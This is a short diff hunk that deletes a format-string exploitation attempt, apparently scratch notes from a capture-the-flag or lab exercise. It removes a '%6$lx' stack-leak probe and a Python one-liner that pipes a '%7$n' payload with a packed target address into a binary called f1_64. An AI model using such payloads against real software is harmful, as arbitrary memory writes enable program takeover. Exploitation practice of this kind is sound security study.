@@ -1,5 +1,0 @@
-AAAA0000%6$lx
-
-
-
-python -c 'print "A%7$n\0AB\x4c\x10\x60\x00\x00\x00\x00\x00"' | ./f1_64
